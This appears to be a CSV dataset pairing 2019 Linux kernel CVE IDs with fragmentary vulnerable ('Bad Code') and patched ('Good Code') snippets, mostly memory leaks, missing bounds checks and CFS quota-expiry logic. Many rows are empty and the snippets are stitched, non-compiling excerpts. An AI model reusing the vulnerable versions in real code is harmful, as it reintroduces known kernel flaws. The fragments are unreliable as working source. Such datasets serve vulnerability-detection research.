Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2019,DoS ,CVE-2019-19922,"specification of the maximum CPU bandwidth available to a group or hierarchy.

The bandwidth allowed for a group is specified using a quota and period. Within
each given ""period"" (microseconds), a group is allowed to consume only up to
""quota"" microseconds of CPU time.  When the CPU bandwidth consumption of a
group exceeds this limit (for that period), the tasks belonging to its
hierarchy will be throttled and are not allowed to run again until the next
period.

A group's unused runtime is globally tracked, being refreshed with quota units
above at each period boundary.  As threads consume this bandwidth it is
transferred to cpu-local ""silos"" on a demand basis.  The amount transferred

within each of these updates is tunable and described as the ""slice"".

Management

A value of -1 for cpu.cfs_quota_us indicates that the group does not have any
bandwidth restriction in place, such a group is described as an unconstrained
bandwidth group.  This represents the traditional work-conserving behavior for
CFS.

Writing any (valid) positive value(s) will enact the specified bandwidth limit.
The minimum quota allowed for the quota or period is 1ms.  There is also an
upper bound on the period length of 1s.  Additional restrictions exist when
bandwidth limits are used in a hierarchical fashion, these are explained in
more detail below.

System wide settings
--------------------
For efficiency run-time is transferred between the global pool and CPU local
""silos"" in a batch fashion.  This greatly reduces global accounting pressure
on large systems.  The amount transferred each time such an update is required
is described as the ""slice"".

This is tunable via procfs::
In case b) above, even though the child may have runtime remaining it will not
be allowed to until the parent's runtime is refreshed.














































Examples
--------
1. Limit a group to 1 CPU worth of runtime::

	now = sched_clock_cpu(smp_processor_id());
	cfs_b->runtime = cfs_b->quota;
	cfs_b->runtime_expires = now + ktime_to_ns(cfs_b->period);
	cfs_b->expires_seq++;
}

static inline struct cfs_bandwidth *tg_cfs_bandwidth(struct task_group *tg)
{
 struct task_group *tg = cfs_rq->tg;
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg);
	u64 amount = 0, min_amount, expires;
 int expires_seq;

 /* note: this is a positive sum as runtime_remaining <= 0 */
	min_amount = sched_cfs_bandwidth_slice() - cfs_rq->runtime_remaining;
			cfs_b->idle = 0;
		}
	}
	expires_seq = cfs_b->expires_seq;
	expires = cfs_b->runtime_expires;
 raw_spin_unlock(&cfs_b->lock);

	cfs_rq->runtime_remaining += amount;
 /*
	 * we may have advanced our local expiration to account for allowed
	 * spread between our sched_clock and the one on which runtime was
	 * issued.
 */
 if (cfs_rq->expires_seq != expires_seq) {
		cfs_rq->expires_seq = expires_seq;
		cfs_rq->runtime_expires = expires;
	}

 return cfs_rq->runtime_remaining > 0;
}

/*
 * Note: This depends on the synchronization provided by sched_clock and the
 * fact that rq->clock snapshots this value.
 */
static void expire_cfs_rq_runtime(struct cfs_rq *cfs_rq)
{
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(cfs_rq->tg);

 /* if the deadline is ahead of our clock, nothing to do */
 if (likely((s64)(rq_clock(rq_of(cfs_rq)) - cfs_rq->runtime_expires) < 0))
 return;

 if (cfs_rq->runtime_remaining < 0)
 return;

 /*
	 * If the local deadline has passed we have to consider the
	 * possibility that our sched_clock is 'fast' and the global deadline
	 * has not truly expired.
	 *
	 * Fortunately we can check determine whether this the case by checking
	 * whether the global deadline(cfs_b->expires_seq) has advanced.
 */
 if (cfs_rq->expires_seq == cfs_b->expires_seq) {
 /* extend local deadline, drift is bounded above by 2 ticks */
		cfs_rq->runtime_expires += TICK_NSEC;
	} else {
 /* global deadline is ahead, expiration has passed */
		cfs_rq->runtime_remaining = 0;
	}
}

static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, u64 delta_exec)
{
 /* dock delta_exec before expiring quota (as it could span periods) */
	cfs_rq->runtime_remaining -= delta_exec;
 expire_cfs_rq_runtime(cfs_rq);

 if (likely(cfs_rq->runtime_remaining > 0))
 return;
 resched_curr(rq);
}

static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,
		u64 remaining, u64 expires)
{
 struct cfs_rq *cfs_rq;
	u64 runtime;
		remaining -= runtime;

		cfs_rq->runtime_remaining += runtime;
		cfs_rq->runtime_expires = expires;

 /* we check whether we're throttled above */
 if (cfs_rq->runtime_remaining > 0)
 */
static int do_sched_cfs_period_timer(struct cfs_bandwidth *cfs_b, int overrun, unsigned long flags)
{
	u64 runtime, runtime_expires;
 int throttled;

 /* no need to continue the timer with no bandwidth constraint */
 /* account preceding periods in which throttling occurred */
	cfs_b->nr_throttled += overrun;

	runtime_expires = cfs_b->runtime_expires;

 /*
	 * This check is repeated as we are holding onto the new bandwidth while
	 * we unthrottle. This can potentially race with an unthrottled group
		cfs_b->distribute_running = 1;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
 /* we can't nest cfs_b->lock while distributing bandwidth */
		runtime = distribute_cfs_runtime(cfs_b, runtime,
						 runtime_expires);
 raw_spin_lock_irqsave(&cfs_b->lock, flags);

		cfs_b->distribute_running = 0;
 return;

 raw_spin_lock(&cfs_b->lock);
 if (cfs_b->quota != RUNTIME_INF &&
	    cfs_rq->runtime_expires == cfs_b->runtime_expires) {
		cfs_b->runtime += slack_runtime;

 /* we are under rq->lock, defer unthrottling using a timer */
{
	u64 runtime = 0, slice = sched_cfs_bandwidth_slice();
 unsigned long flags;
	u64 expires;

 /* confirm we're still not at a refresh boundary */
 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (cfs_b->quota != RUNTIME_INF && cfs_b->runtime > slice)
		runtime = cfs_b->runtime;

	expires = cfs_b->runtime_expires;
 if (runtime)
		cfs_b->distribute_running = 1;

 if (!runtime)
 return;

	runtime = distribute_cfs_runtime(cfs_b, runtime, expires);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (expires == cfs_b->runtime_expires)
 lsub_positive(&cfs_b->runtime, runtime);
	cfs_b->distribute_running = 0;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
}

	cfs_b->period_active = 1;
	overrun = hrtimer_forward_now(&cfs_b->period_timer, cfs_b->period);
	cfs_b->runtime_expires += (overrun + 1) * ktime_to_ns(cfs_b->period);
	cfs_b->expires_seq++;
 hrtimer_start_expires(&cfs_b->period_timer, HRTIMER_MODE_ABS_PINNED);
}

	u64			quota;
	u64			runtime;
	s64			hierarchical_quota;
	u64			runtime_expires;
 int			expires_seq;

	u8			idle;
	u8			period_active;

#ifdef CONFIG_CFS_BANDWIDTH
 int			runtime_enabled;
 int			expires_seq;
	u64			runtime_expires;
	s64			runtime_remaining;

	u64			throttled_clock;
","specification of the maximum CPU bandwidth available to a group or hierarchy.

The bandwidth allowed for a group is specified using a quota and period. Within
each given ""period"" (microseconds), a task group is allocated up to ""quota""
microseconds of CPU time. That quota is assigned to per-cpu run queues in
slices as threads in the cgroup become runnable. Once all quota has been
assigned any additional requests for quota will result in those threads being
throttled. Throttled threads will not be able to run again until the next
period when the quota is replenished.

A group's unassigned quota is globally tracked, being refreshed back to
cfs_quota units at each period boundary. As threads consume this bandwidth it
is transferred to cpu-local ""silos"" on a demand basis. The amount transferred
within each of these updates is tunable and described as the ""slice"".

Management

A value of -1 for cpu.cfs_quota_us indicates that the group does not have any
bandwidth restriction in place, such a group is described as an unconstrained
bandwidth group. This represents the traditional work-conserving behavior for
CFS.

Writing any (valid) positive value(s) will enact the specified bandwidth limit.
The minimum quota allowed for the quota or period is 1ms. There is also an
upper bound on the period length of 1s. Additional restrictions exist when
bandwidth limits are used in a hierarchical fashion, these are explained in
more detail below.

System wide settings
--------------------
For efficiency run-time is transferred between the global pool and CPU local
""silos"" in a batch fashion. This greatly reduces global accounting pressure
on large systems. The amount transferred each time such an update is required
is described as the ""slice"".

This is tunable via procfs::
In case b) above, even though the child may have runtime remaining it will not
be allowed to until the parent's runtime is refreshed.

CFS Bandwidth Quota Caveats
---------------------------
Once a slice is assigned to a cpu it does not expire.  However all but 1ms of
the slice may be returned to the global pool if all threads on that cpu become
unrunnable. This is configured at compile time by the min_cfs_rq_runtime
variable. This is a performance tweak that helps prevent added contention on
the global lock.

The fact that cpu-local slices do not expire results in some interesting corner
cases that should be understood.

For cgroup cpu constrained applications that are cpu limited this is a
relatively moot point because they will naturally consume the entirety of their
quota as well as the entirety of each cpu-local slice in each period. As a
result it is expected that nr_periods roughly equal nr_throttled, and that
cpuacct.usage will increase roughly equal to cfs_quota_us in each period.

For highly-threaded, non-cpu bound applications this non-expiration nuance
allows applications to briefly burst past their quota limits by the amount of
unused slice on each cpu that the task group is running on (typically at most
1ms per cpu or as defined by min_cfs_rq_runtime).  This slight burst only
applies if quota had been assigned to a cpu and then not fully used or returned
in previous periods. This burst amount will not be transferred between cores.
As a result, this mechanism still strictly limits the task group to quota
average usage, albeit over a longer time window than a single period.  This
also limits the burst ability to no more than 1ms per cpu.  This provides
better more predictable user experience for highly threaded applications with
small quota limits on high core count machines. It also eliminates the
propensity to throttle these applications while simultanously using less than
quota amounts of cpu. Another way to say this, is that by allowing the unused
portion of a slice to remain valid across periods we have decreased the
possibility of wastefully expiring quota on cpu-local silos that don't need a
full slice's amount of cpu time.

The interaction between cpu-bound and non-cpu-bound-interactive applications
should also be considered, especially when single core usage hits 100%. If you
gave each of these applications half of a cpu-core and they both got scheduled
on the same CPU it is theoretically possible that the non-cpu bound application
will use up to 1ms additional quota in some periods, thereby preventing the
cpu-bound application from fully using its quota by that same amount. In these
instances it will be up to the CFS algorithm (see sched-design-CFS.rst) to
decide which application is chosen to run, as they will both be runnable and
have remaining quota. This runtime discrepancy will be made up in the following
periods when the interactive application idles.

Examples
--------
1. Limit a group to 1 CPU worth of runtime::

	now = sched_clock_cpu(smp_processor_id());
	cfs_b->runtime = cfs_b->quota;


}

static inline struct cfs_bandwidth *tg_cfs_bandwidth(struct task_group *tg)
{
 struct task_group *tg = cfs_rq->tg;
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg);
	u64 amount = 0, min_amount;


 /* note: this is a positive sum as runtime_remaining <= 0 */
	min_amount = sched_cfs_bandwidth_slice() - cfs_rq->runtime_remaining;
			cfs_b->idle = 0;
		}
	}


 raw_spin_unlock(&cfs_b->lock);

	cfs_rq->runtime_remaining += amount;










 return cfs_rq->runtime_remaining > 0;
}

































static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, u64 delta_exec)
{
 /* dock delta_exec before expiring quota (as it could span periods) */
	cfs_rq->runtime_remaining -= delta_exec;


 if (likely(cfs_rq->runtime_remaining > 0))
 return;
 resched_curr(rq);
}

static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, u64 remaining)

{
 struct cfs_rq *cfs_rq;
	u64 runtime;
		remaining -= runtime;

		cfs_rq->runtime_remaining += runtime;


 /* we check whether we're throttled above */
 if (cfs_rq->runtime_remaining > 0)
 */
static int do_sched_cfs_period_timer(struct cfs_bandwidth *cfs_b, int overrun, unsigned long flags)
{
	u64 runtime;
 int throttled;

 /* no need to continue the timer with no bandwidth constraint */
 /* account preceding periods in which throttling occurred */
	cfs_b->nr_throttled += overrun;



 /*
	 * This check is repeated as we are holding onto the new bandwidth while
	 * we unthrottle. This can potentially race with an unthrottled group
		cfs_b->distribute_running = 1;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
 /* we can't nest cfs_b->lock while distributing bandwidth */
		runtime = distribute_cfs_runtime(cfs_b, runtime);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);

		cfs_b->distribute_running = 0;
 return;

 raw_spin_lock(&cfs_b->lock);
 if (cfs_b->quota != RUNTIME_INF) {

		cfs_b->runtime += slack_runtime;

 /* we are under rq->lock, defer unthrottling using a timer */
{
	u64 runtime = 0, slice = sched_cfs_bandwidth_slice();
 unsigned long flags;


 /* confirm we're still not at a refresh boundary */
 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (cfs_b->quota != RUNTIME_INF && cfs_b->runtime > slice)
		runtime = cfs_b->runtime;


 if (runtime)
		cfs_b->distribute_running = 1;

 if (!runtime)
 return;

	runtime = distribute_cfs_runtime(cfs_b, runtime);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 lsub_positive(&cfs_b->runtime, runtime);

	cfs_b->distribute_running = 0;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
}

	cfs_b->period_active = 1;
	overrun = hrtimer_forward_now(&cfs_b->period_timer, cfs_b->period);


 hrtimer_start_expires(&cfs_b->period_timer, HRTIMER_MODE_ABS_PINNED);
}

	u64			quota;
	u64			runtime;
	s64			hierarchical_quota;



	u8			idle;
	u8			period_active;

#ifdef CONFIG_CFS_BANDWIDTH
 int			runtime_enabled;


	s64			runtime_remaining;

	u64			throttled_clock;
"
2019,,CVE-2019-19816,,
2019,,CVE-2019-19815,,
2019,,CVE-2019-19814,,
2019,,CVE-2019-19813,,
2019,,CVE-2019-19807," goto unlock;
	}
 if (!list_empty(&timer->open_list_head)) {
		timeri = list_entry(timer->open_list_head.next,

 struct snd_timer_instance, open_list);
 if (timeri->flags & SNDRV_TIMER_IFLG_EXCLUSIVE) {
			err = -EBUSY;
			timeri = NULL;
 goto unlock;
		}
	}
"," goto unlock;
	}
 if (!list_empty(&timer->open_list_head)) {
 struct snd_timer_instance *t =
 list_entry(timer->open_list_head.next,
 struct snd_timer_instance, open_list);
 if (t->flags & SNDRV_TIMER_IFLG_EXCLUSIVE) {
			err = -EBUSY;

 goto unlock;
		}
	}
"
2019,,CVE-2019-19770,,
2019,,CVE-2019-19769,,
2019,,CVE-2019-19768,,
2019,,CVE-2019-19767,"{
 struct ext4_inode *raw_inode;
 struct ext4_xattr_ibody_header *header;


 int error;














	raw_inode = ext4_raw_inode(iloc);

	header = IHDR(inode, raw_inode);
{
 struct ext4_sb_info *sbi = EXT4_SB(sb);
 struct ext4_super_block *es = sbi->s_es;



 /* determine the minimum size of new large inodes, if present */
 if (sbi->s_inode_size > EXT4_GOOD_OLD_INODE_SIZE &&
	    sbi->s_want_extra_isize == 0) {
		sbi->s_want_extra_isize = sizeof(struct ext4_inode) -
						     EXT4_GOOD_OLD_INODE_SIZE;

 if (ext4_has_feature_extra_isize(sb)) {
 if (sbi->s_want_extra_isize <
 le16_to_cpu(es->s_want_extra_isize))
		}
	}
 /* Check if enough inode space is available */
 if (EXT4_GOOD_OLD_INODE_SIZE + sbi->s_want_extra_isize >
  sbi->s_inode_size) {
		sbi->s_want_extra_isize = sizeof(struct ext4_inode) -
 				       EXT4_GOOD_OLD_INODE_SIZE;
 ext4_msg(sb, KERN_INFO,
 ""required extra inode space not available"");
	}
","{
 struct ext4_inode *raw_inode;
 struct ext4_xattr_ibody_header *header;
 unsigned int inode_size = EXT4_INODE_SIZE(inode->i_sb);
 struct ext4_inode_info *ei = EXT4_I(inode);
 int error;

 /* this was checked at iget time, but double check for good measure */
 if ((EXT4_GOOD_OLD_INODE_SIZE + ei->i_extra_isize > inode_size) ||
	    (ei->i_extra_isize & 3)) {
 EXT4_ERROR_INODE(inode, ""bad extra_isize %u (inode size %u)"",
				 ei->i_extra_isize,
 EXT4_INODE_SIZE(inode->i_sb));
 return -EFSCORRUPTED;
	}
 if ((new_extra_isize < ei->i_extra_isize) ||
	    (new_extra_isize < 4) ||
	    (new_extra_isize > inode_size - EXT4_GOOD_OLD_INODE_SIZE))
 return -EINVAL;	/* Should never happen */

	raw_inode = ext4_raw_inode(iloc);

	header = IHDR(inode, raw_inode);
{
 struct ext4_sb_info *sbi = EXT4_SB(sb);
 struct ext4_super_block *es = sbi->s_es;
 unsigned def_extra_isize = sizeof(struct ext4_inode) -
						EXT4_GOOD_OLD_INODE_SIZE;

 if (sbi->s_inode_size == EXT4_GOOD_OLD_INODE_SIZE) {
		sbi->s_want_extra_isize = 0;
 return;
	}
 if (sbi->s_want_extra_isize < 4) {
		sbi->s_want_extra_isize = def_extra_isize;
 if (ext4_has_feature_extra_isize(sb)) {
 if (sbi->s_want_extra_isize <
 le16_to_cpu(es->s_want_extra_isize))
		}
	}
 /* Check if enough inode space is available */
 if ((sbi->s_want_extra_isize > sbi->s_inode_size) ||
     (EXT4_GOOD_OLD_INODE_SIZE + sbi->s_want_extra_isize >
  sbi->s_inode_size)) {
 sbi->s_want_extra_isize = def_extra_isize;
 ext4_msg(sb, KERN_INFO,
 ""required extra inode space not available"");
	}
"
2019,DoS Overflow Mem. Corr. ,CVE-2019-19602,"
static inline int fpregs_state_valid(struct fpu *fpu, unsigned int cpu)
{
 return fpu == this_cpu_read_stable(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;
}

/*
","
static inline int fpregs_state_valid(struct fpu *fpu, unsigned int cpu)
{
 return fpu == this_cpu_read(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;
}

/*
"
2019,,CVE-2019-19543,,
2019,,CVE-2019-19537,,
2019,,CVE-2019-19536,,
2019,#NAME?,CVE-2019-19535,,
2019,,CVE-2019-19534,,
2019,,CVE-2019-19533,,
2019,,CVE-2019-19532,,
2019,,CVE-2019-19531,,
2019,,CVE-2019-19530,,
2019,,CVE-2019-19529,,
2019,,CVE-2019-19528,,
2019,,CVE-2019-19527,,
2019,,CVE-2019-19526,,
2019,,CVE-2019-19525,,
2019,,CVE-2019-19524,,
2019,,CVE-2019-19523,,
2019,DoS ,CVE-2019-19462,,
2019,,CVE-2019-19449,,
2019,,CVE-2019-19448,,
2019,,CVE-2019-19447,,
2019,,CVE-2019-19378,,
2019,,CVE-2019-19377,,
2020,,CVE-2019-19338,,
2020,DoS ,CVE-2019-19332,,
2019,,CVE-2019-19319,,
2019,,CVE-2019-19318,,
2019,,CVE-2019-19252,,
2019,Bypass ,CVE-2019-19241,,
2019,DoS ,CVE-2019-19227,,
2019,DoS ,CVE-2019-19083," return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
"," return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
"
2019,DoS ,CVE-2019-19082," if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool, asic_id))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(init_data->num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
"," if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool, asic_id))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(init_data->num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
"
2019,DoS ,CVE-2019-19081,"		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;

 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, port_type, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);

 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_repr_init(app, repr,
				    port_id, port, priv->nn->dp.netdev);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
","		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, port_type, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);
 kfree(repr_priv);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_repr_init(app, repr,
				    port_id, port, priv->nn->dp.netdev);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
"
2019,DoS ,CVE-2019-19080,"		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;

 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, NFP_PORT_PHYS_PORT, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);

 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_port_init_phy_port(app->pf, app, port, i);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		err = nfp_repr_init(app, repr,
				    cmsg_port_id, port, priv->nn->dp.netdev);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
","		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, NFP_PORT_PHYS_PORT, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);
 kfree(repr_priv);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_port_init_phy_port(app->pf, app, port, i);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		err = nfp_repr_init(app, repr,
				    cmsg_port_id, port, priv->nn->dp.netdev);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
"
2019,DoS ,CVE-2019-19079," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from))

 return -EFAULT;


	ret = qrtr_endpoint_post(&tun->ep, kbuf, len);


 return ret < 0 ? ret : len;
}

"," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from)) {
 kfree(kbuf);
 return -EFAULT;
	}

	ret = qrtr_endpoint_post(&tun->ep, kbuf, len);

 kfree(kbuf);
 return ret < 0 ? ret : len;
}

"
2019,DoS ,CVE-2019-19078," ath10k_dbg(ar, ATH10K_DBG_USB_BULK,
 ""usb bulk transmit failed: %d\n"", ret);
 usb_unanchor_urb(urb);

			ret = -EINVAL;
 goto err_free_urb_to_pipe;
		}
"," ath10k_dbg(ar, ATH10K_DBG_USB_BULK,
 ""usb bulk transmit failed: %d\n"", ret);
 usb_unanchor_urb(urb);
 usb_free_urb(urb);
			ret = -EINVAL;
 goto err_free_urb_to_pipe;
		}
"
2019,DoS ,CVE-2019-19077," dev_err(rdev_to_dev(rdev), ""SRQ copy to udata failed!"");
 bnxt_qplib_destroy_srq(&rdev->qplib_res,
					       &srq->qplib_srq);
 goto exit;
		}
	}
 if (nq)
"," dev_err(rdev_to_dev(rdev), ""SRQ copy to udata failed!"");
 bnxt_qplib_destroy_srq(&rdev->qplib_res,
					       &srq->qplib_srq);
 goto fail;
		}
	}
 if (nq)
"
2019,DoS ,CVE-2019-19076,"	u8 mask, val;
 int err;

 if (!nfp_abm_u32_check_knode(alink->abm, knode, proto, extack))

 goto err_delete;


	tos_off = proto == htons(ETH_P_IP) ? 16 : 20;

 if ((iter->val & cmask) == (val & cmask) &&
		    iter->band != knode->res->classid) {
 NL_SET_ERR_MSG_MOD(extack, ""conflict with already offloaded filter"");

 goto err_delete;
		}
	}

 if (!match) {
		match = kzalloc(sizeof(*match), GFP_KERNEL);
 if (!match)
 return -ENOMEM;



 list_add(&match->list, &alink->dscp_map);
	}
	match->handle = knode->handle;

err_delete:
 nfp_abm_u32_knode_delete(alink, knode);
 return -EOPNOTSUPP;
}

static int nfp_abm_setup_tc_block_cb(enum tc_setup_type type,
","	u8 mask, val;
 int err;

 if (!nfp_abm_u32_check_knode(alink->abm, knode, proto, extack)) {
		err = -EOPNOTSUPP;
 goto err_delete;
	}

	tos_off = proto == htons(ETH_P_IP) ? 16 : 20;

 if ((iter->val & cmask) == (val & cmask) &&
		    iter->band != knode->res->classid) {
 NL_SET_ERR_MSG_MOD(extack, ""conflict with already offloaded filter"");
			err = -EOPNOTSUPP;
 goto err_delete;
		}
	}

 if (!match) {
		match = kzalloc(sizeof(*match), GFP_KERNEL);
 if (!match) {
			err = -ENOMEM;
 goto err_delete;
		}

 list_add(&match->list, &alink->dscp_map);
	}
	match->handle = knode->handle;

err_delete:
 nfp_abm_u32_knode_delete(alink, knode);
 return err;
}

static int nfp_abm_setup_tc_block_cb(enum tc_setup_type type,
"
2019,DoS ,CVE-2019-19075," goto error;
	}


	ret = ca8210_get_platform_data(priv->spi, pdata);
 if (ret) {
 dev_crit(&spi_device->dev, ""ca8210_get_platform_data failed\n"");
 goto error;
	}
	priv->spi->dev.platform_data = pdata;

	ret = ca8210_dev_com_init(priv);
 if (ret) {
"," goto error;
	}

	priv->spi->dev.platform_data = pdata;
	ret = ca8210_get_platform_data(priv->spi, pdata);
 if (ret) {
 dev_crit(&spi_device->dev, ""ca8210_get_platform_data failed\n"");
 goto error;
	}


	ret = ca8210_dev_com_init(priv);
 if (ret) {
"
2019,DoS ,CVE-2019-19074," ath_dbg(common, WMI, ""Timeout waiting for WMI command: %s\n"",
 wmi_cmd_to_name(cmd_id));
 mutex_unlock(&wmi->op_mutex);

 return -ETIMEDOUT;
	}

"," ath_dbg(common, WMI, ""Timeout waiting for WMI command: %s\n"",
 wmi_cmd_to_name(cmd_id));
 mutex_unlock(&wmi->op_mutex);
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

"
2019,DoS ,CVE-2019-19073,"	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC credit config timeout\n"");

 return -ETIMEDOUT;
	}

	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC start timeout\n"");

 return -ETIMEDOUT;
	}

 if (!time_left) {
 dev_err(target->dev, ""Service connection timeout for: %d\n"",
			service_connreq->service_id);

 return -ETIMEDOUT;
	}

","	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC credit config timeout\n"");
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC start timeout\n"");
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

 if (!time_left) {
 dev_err(target->dev, ""Service connection timeout for: %d\n"",
			service_connreq->service_id);
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

"
